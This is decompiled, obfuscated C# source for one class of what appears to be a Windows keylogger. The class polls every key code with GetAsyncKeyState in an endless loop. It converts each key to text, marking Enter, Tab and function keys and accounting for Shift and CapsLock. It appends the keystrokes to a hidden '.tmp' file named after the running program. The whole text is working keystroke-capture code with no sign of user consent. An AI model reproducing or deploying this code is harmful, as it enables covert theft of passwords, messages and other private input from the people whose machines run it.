using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns5;

namespace ns1;

internal class Class1
{
	internal int int_0;

	internal string string_0;

	private Keys keys_0;

	public Clock clock_0;

	public string string_1;

	private object object_0;

	public string string_2;

	public Class1()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		keys_0 = (Keys)0;
		clock_0 = new Clock();
		string_1 = "";
		object_0 = (object)new Keyboard();
		string_2 = Assembly.GetExecutingAssembly().Location + new string(new char[4] { '.', 't', 'm', 'p' });
	}

	private string method_0(Keys keys_1)
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Invalid comparison between Unknown and I4
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Invalid comparison between Unknown and I4
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Invalid comparison between Unknown and I4
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Invalid comparison between Unknown and I4
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Invalid comparison between Unknown and I4
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Invalid comparison between Unknown and I4
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_008e: Invalid comparison between Unknown and I4
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Invalid comparison between Unknown and I4
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Invalid comparison between Unknown and I4
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Invalid comparison between Unknown and I4
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Invalid comparison between Unknown and I4
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Invalid comparison between Unknown and I4
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Invalid comparison between Unknown and I4
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c5: Invalid comparison between Unknown and I4
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Invalid comparison between Unknown and I4
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Invalid comparison between Unknown and I4
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Invalid comparison between Unknown and I4
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Invalid comparison between Unknown and I4
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Invalid comparison between Unknown and I4
		//IL_0100: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Invalid comparison between Unknown and I4
		//IL_0108: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Invalid comparison between Unknown and I4
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Invalid comparison between Unknown and I4
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Invalid comparison between Unknown and I4
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Invalid comparison between Unknown and I4
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Invalid comparison between Unknown and I4
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Invalid comparison between Unknown and I4
		//IL_019c: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_0269: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0291: Expected I4, but got Unknown
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ad: Expected I4, but got Unknown
		bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(object_0, (Type)null, "ShiftKeyDown", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(object_0, (Type)null, "CapsLock", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			flag = ((!flag) ? true : false);
		}
		string result;
		try
		{
			result = (((int)keys_1 == 112 || (int)keys_1 == 113 || (int)keys_1 == 114 || (int)keys_1 == 115 || (int)keys_1 == 116 || (int)keys_1 == 117 || (int)keys_1 == 118 || (int)keys_1 == 119 || (int)keys_1 == 120 || (int)keys_1 == 121 || (int)keys_1 == 122 || (int)keys_1 == 123 || (int)keys_1 == 35 || (int)keys_1 == 46 || (int)keys_1 == 8) ? ("[" + ((Enum)keys_1).ToString() + "]") : (((int)keys_1 == 160 || (int)keys_1 == 161 || (int)keys_1 == 65536 || (int)keys_1 == 16 || (int)keys_1 == 131072 || (int)keys_1 == 17 || (int)keys_1 == 163 || (int)keys_1 == 162 || (int)keys_1 == 262144) ? "" : (((int)keys_1 == 32) ? new string(new char[1] { ' ' }) : (((int)keys_1 != 13 && (int)keys_1 != 13) ? (((int)keys_1 == 9) ? (new string(new char[5] { '[', 'T', 'A', 'P', ']' }) + "\r\n") : checked((!flag) ? Class24.smethod_171((uint)keys_1) : Class24.smethod_171((uint)keys_1).ToUpper())) : ((!string_1.EndsWith(new string(new char[7] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + "\r\n")) ? (new string(new char[7] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + "\r\n") : "")))));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			if (flag)
			{
				result = Strings.ChrW((int)keys_1).ToString().ToUpper();
				ProjectData.ClearProjectError();
			}
			else
			{
				result = Strings.ChrW((int)keys_1).ToString().ToLower();
				ProjectData.ClearProjectError();
			}
		}
		return result;
	}

	public unsafe void method_1()
	{
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		void* ptr = stackalloc byte[12];
		try
		{
			string_1 = File.ReadAllText(string_2);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
		try
		{
			*(int*)ptr = 0;
			while (true)
			{
				checked
				{
					(*unchecked((int*)ptr))++;
				}
				*(int*)((byte*)ptr + 4) = 0;
				do
				{
					if (Class24.GetAsyncKeyState(*(int*)((byte*)ptr + 4)) == -32767)
					{
						Keys keys_ = (Keys)(*(int*)((byte*)ptr + 4));
						string text = method_0(keys_);
						if (text.Length > 0)
						{
							string_1 += Class24.smethod_164(this);
							string_1 += text;
						}
						keys_0 = keys_;
					}
					checked
					{
						(*unchecked((int*)((byte*)ptr + 4)))++;
					}
				}
				while (*(int*)((byte*)ptr + 4) <= 255);
				if (*(int*)ptr == 1000)
				{
					*(int*)ptr = 0;
					*(int*)((byte*)ptr + 8) = 20480;
					if (string_1.Length > *(int*)((byte*)ptr + 8))
					{
						checked
						{
							string_1 = string_1.Remove(0, string_1.Length - *unchecked((int*)((byte*)ptr + 8)));
						}
					}
					File.WriteAllText(string_2, string_1);
				}
				Thread.Sleep(1);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			ProjectData.ClearProjectError();
		}
	}
}
